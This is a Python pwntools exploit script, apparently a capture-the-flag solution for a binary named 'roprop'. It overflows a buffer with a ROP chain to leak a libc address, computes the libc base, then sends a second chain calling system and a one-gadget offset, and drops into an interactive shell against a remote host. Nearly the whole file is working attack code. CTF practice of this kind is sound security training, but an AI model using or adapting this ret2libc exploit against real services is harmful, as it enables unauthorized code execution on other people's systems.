#!/usr/bin/env python3

from pwn import *

_FILE = "./roprop"

binary = context.binary = ELF(_FILE, checksec=False)

env = {}

_LIBC = binary.libc

if args.GDB:
    p = gdb.debug(_FILE, gdbscript="\nb *0x4008fd\nc\n", env=env)
elif args.REMOTE:
    p = remote("roprop.darkarmy.xyz", 5002)
    _LIBC = ELF("libc6_2.27-3ubuntu1.2_amd64.so", checksec=False)

else:
    p = process(_FILE, env=env)

rop = ROP(binary)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

p.clean()

payload = cyclic(88, n=8)

payload += p64(pop_rdi)

payload += p64(binary.got["gets"])

payload += p64(binary.plt["puts"])

payload += p64(binary.sym["main"])

p.sendline(payload)

gets_addr = u64(p.recvline()[:-1].ljust(8, b"\x00"))

log.info(f"Gets addr: {hex(gets_addr)}")

print("go to https://libc.blukat.me and enter above values to get the right libc")

p.clean()


#gets_offset = int(input("whats gets offset?(in hex): ").replace("0x", ""), 16)

#system = int(input("whats system offset?(in hex): ").replace("0x", ""), 16)

#bin_sh = int(input("whats str_bin_sh offset?(in hex): "), 16)

#offset = gets_addr - gets_offset

_LIBC.address = gets_addr - _LIBC.sym["gets"]

payload = cyclic(88, n=8)

if args.REMOTE:
    payload += p64(_LIBC.address + 0x4f3c2)

payload += p64(pop_rdi)

payload += p64(next(_LIBC.search(b"/bin/ls\0"))) #p64(bin_sh)

payload += p64(_LIBC.sym["system"])  #p64(offset + system)

payload += p64(binary.sym["main"])

payload += b"\x00"*0x100

p.sendline(payload)

p.interactive()

try:
    p.sendline("whoami")
    log.success("Preparing your shell")
    p.interactive()
except:
    log.error("something went wrong")

